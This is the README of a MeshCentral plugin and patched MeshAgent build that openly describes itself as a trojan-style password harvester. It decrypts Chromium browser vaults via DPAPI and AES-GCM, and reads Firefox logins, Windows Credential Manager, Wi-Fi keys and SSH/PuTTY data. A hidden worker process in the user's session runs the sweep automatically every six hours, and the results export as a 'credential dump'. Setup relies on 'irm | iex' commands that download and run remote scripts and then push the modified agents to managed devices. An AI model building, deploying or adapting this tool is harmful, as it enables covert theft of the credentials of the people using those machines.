# MeshCentral Password Recovery (`mcpassrec`)

Password recovery for [MeshCentral](https://github.com/Ylianst/MeshCentral),
built the same way the MeshCentral Audio / Keylogger projects are: a **native C
module compiled into MeshAgent** plus a MeshCentral plugin that adds a
first-class **Passwords** tab to every device page.

It does "full password recovery" the way a remote-access trojan does it — a
credential sweep that runs in the logged-on user's session:

- **Chromium-family browser vaults** (Chrome, Edge, Brave, Vivaldi, Opera,
  Chromium, Ungoogled Chromium): `Login Data` SQLite rows, the DPAPI-protected
  AES key from `Local State`, and **AES-256-GCM decryption** of each stored
  password.
- **Firefox** `logins.json` (host + username; password best-effort).
- **Windows Credential Manager** (`CredEnumerateW`, DPAPI-decrypts generic
  credentials).
- **Wi-Fi** profile passwords (`netsh wlan ... key=clear`).
- **SSH** key inventory and **PuTTY** saved sessions (registry).

- **Trojan-style auto-harvest** — the agent sweeps automatically on a timer
  (every 6 h by default) and accumulates everything into a rolling report,
  whether or not anyone is looking.
- **Live + on-demand** — the tab shows recovered credentials live and lets you
  trigger a sweep from the browser at any time.
- **Savable report** — the agent renders the accumulated credentials as
  **CSV / JSON / HTML** on demand, and the tab downloads it. That is the
  credential dump.
- No third-party dependencies; plain JSON over the authenticated agent relay
  (tunnel protocol **18**).

## Install & set up on your own MeshCentral server

### Prerequisites

- A Windows machine running a MeshCentral server (the default install:
  `C:\Program Files\Open Source\MeshCentral`, data in `meshcentral-data\`).
  The install path can be anything — pass it with `-MeshCentralRoot`.
- Node.js available on the server (the server needs it to run anyway; Node
  18+ works, and Node 26 is covered by built-in compat patches — see below).
- The MeshAgent binaries in `binaries/` are prebuilt; no build needed.

### Step 1 — Patch the server

PowerShell **as administrator**, on the server:

```powershell
powershell -c "irm https://raw.githubusercontent.com/og-debug447/mesh-pwrecovery/main/install-pwrecovery.ps1 | iex"
```

What it does:

- Patches the MeshCentral package (relay rights check for tunnel protocol 18,
  tunnel dispatch, device page templates with the new **Passwords** tab / page
  62) — idempotent; pre-patch copies of the MeshCentral files are kept in
  `meshcentral-data\mcpassrec-backups\<timestamp>`.
- Copies the plugin (`mcpassrec.js`, `config.json`, the viewmode controller,
  the `win-passwordrecovery` agent module) into
  `meshcentral-data\plugins\mcpassrec\` and runs the plugin patcher.
- Applies **Node.js ≥ 26 compatibility patches** to the installed
  `node_modules` tree (fd-slicer ×2 and pluginHandler — without them, plugin
  zip extraction hangs or truncates on Node 26). Re-run after any MeshCentral
  upgrade.
- Restarts the MeshCentral service.

### Step 2 — Publish the password-recovery agent binaries

Still in the elevated PowerShell:

```powershell
powershell -c "irm https://raw.githubusercontent.com/og-debug447/mesh-pwrecovery/main/install-pwrecovery-agent.ps1 | iex"
```

This drops the password-recovery-enabled `MeshService.exe` (x86) and
`MeshService64.exe` (x64) into `meshcentral-data\agents\` **and**
`meshcentral-data\signedagents\` so Agent Update / Reinstall picks them up.
ARM64 and any other user-placed agents are left alone.

### Step 3 — Install the plugin (admin console)

1. Browse to your MeshCentral server → **admin** → **Plugins**.
2. *Install* → paste the plugin URL:
   `https://raw.githubusercontent.com/og-debug447/mesh-pwrecovery/main/config.json`
3. **Hard-refresh the browser (Ctrl+F5).**

### Step 4 — Update the agents

On each Windows device, **PC Control → agent menu → Agent Update** (or
reinstall the agent). Two things to expect the first time:

- **Self-update dance**: after the server restarts, agents notice their exe
  hash no longer matches what the server serves and download / restart a few
  times (~5–6 cycles, 1–2 minutes). That is normal and converges on its own.
- **Auto-harvest**: the module starts the periodic sweep at agent load — no
  per-device toggle. A hidden `passrecover-worker` process appears in the user
  session; that is the thing actually reading the console user's browser
  vaults and credential stores while the service sits in session 0.

### Step 5 — Verify

Open a device → the **Passwords** tab (next to *Plugins*):

- **Connect**, then press **Harvest Now** (or just wait for the periodic
  auto-harvest). Recovered credentials stream into the table:

  | Time | Source | App | Origin | User | Password |
  |------|--------|-----|--------|------|----------|
  | `2026-11-13 23:41:02` | `browser` | `Chrome` | `https://github.com/` | `you` | `……` |
  | `2026-11-13 23:41:02` | `credman` | `Credential Manager` | `target` | `user` | `……` |
  | `2026-11-13 23:41:03` | `wifi` | `Wi-Fi` | `SSID` | — | `……` |

  Source names are colour-coded (browser / credman / wifi / ssh).
- **Refresh Files** lists the agent's `passrec-*.jsonl` /
  `passrec-export-*` files; **View** shows the beginning inline, **Download**
  fetches the whole file.
- **Export** (CSV / JSON / HTML) builds a report on the device and downloads
  it — the credential dump.

If the table stays empty after a harvest, the status line reports the agent's
last error (e.g. `no interactive user session` when nobody is logged on).

## What the Passwords tab does

- **Connect / Disconnect** — opens the authenticated tunnel (protocol 18) to
  the agent. Auto-reconnects a few times if the link drops while the tab is
  open.
- **Harvest Now** — runs a full credential sweep on the device immediately.
- **Start / Stop auto-harvest** — toggles the periodic sweep remotely (the
  agent auto-starts it at boot, default every 6 h).
- **Live table** — the last 2000 recovered credentials, streamed from the
  agent's in-memory ring as they come in.
- **Report files** — View (first ~512 KB inline) or Download (full file) of
  any `passrec-*` file via 64 KB chunks.
- **Export CSV / JSON / HTML** — render the current report on the device and
  download it.

## How it works (short version)

- `agent/ILibDuktape_PassRecover.c` — native Windows credential recovery. The
  agent service (session 0) can't see the console user's DPAPI master key or
  `%LOCALAPPDATA%` profiles, so — exactly like the reference keylogger — it
  relaunches **itself** as a hidden `passrecover-worker` in the interactive
  user's session (`CreateProcessAsUser` on the console user's
  `WTSQueryUserToken` token, environment built with `CreateEnvironmentBlock`).
  The worker performs the sweep (browser DPAPI + AES-GCM, Firefox, Credential
  Manager, Wi-Fi, SSH/PuTTY), writes JSONL, and streams it back over
  `\\.\pipe\mcpassrec`. The agent stores entries in a 2048-entry in-memory
  ring and appends them to a rolling `passrec-YYYY-MM-DD.jsonl` next to the
  agent exe. A background thread re-runs the sweep on a timer (the trojan
  loop). Workers are re-spawned automatically after logoff / user switch.
- `modules_meshcore/win-passwordrecovery.js` — agent side of the tunnel:
  `tail` (live stream, 250 ms drain with backpressure), `harvest`, `start`,
  `stop`, `state`, `list`, `read`, `export`, `unsub`; calls `start()` at load
  so auto-harvest is automatic.
- `plugin/mcpassrec-viewmode.js` — browser controller for the tab, copied to
  `public/scripts/mcpassrec-viewmode.js` by the patcher.
- `scripts/patch_meshcentral.js` — idempotent server patch (meshrelay rights,
  meshcore dispatch + auto-start, both device page templates, page 62).
- `scripts/patch_meshagent.js` — idempotent MeshAgent source patch (C module,
  ScriptContainer init, the `passrecover-worker` branch in `ServiceMain.c`,
  vcxproj/makefile entries).

See `docs/architecture.md` for the full design.

## Building the agent binaries

From a MeshAgent checkout with Visual Studio 2022 (v143) or newer:

```powershell
node scripts/patch_meshagent.js <path-to-MeshAgent>
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=x64
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=x86 /p:PlatformToolset=v143
```

(Use `/p:Platform=x86`, not `Win32` — the solution's x86 platform is named
`x86`; otherwise MSBuild fails with MSB4126. Some BuildTools-only installs
only ship the v143 toolset, in which case pass `/p:PlatformToolset=v143` for
the x86 build too.)

The MeshAgent prebuild generates `microscript\ILibDuktape_Commit.h` and
`MeshService.rc` from the git commit, so the checkout must be a git repository
with `git` on PATH; `agent/ILibDuktape_Commit.h` is a stub that makes a fresh
source zip build without one.

Outputs: `meshservice\Release\MeshService64.exe` and
`meshservice\Release\MeshService.exe`. Replace the files in `binaries/` and
push, then re-run the agent installer.

## Notes

- Auto-harvest is on by default after agent start (every 6 h). **Stop** pauses
  the periodic sweep; the rolling report and previous exports remain on the
  agent.
- The sweep runs in the interactive session via the worker, so the agent works
  whether it runs as a service (session 0) or in a user session (in that case
  the sweep runs in-process, no worker). With no logged-on user the sweep
  reports `no interactive user session`.
- Non-Windows agents get a stub that reports "not available" — the tab still
  works, it just shows the status message.
- Chromium passwords are decrypted with the per-user DPAPI-protected key from
  `Local State`, so each logged-on user's vault is read under that user's
  credentials (the worker runs as the console user).
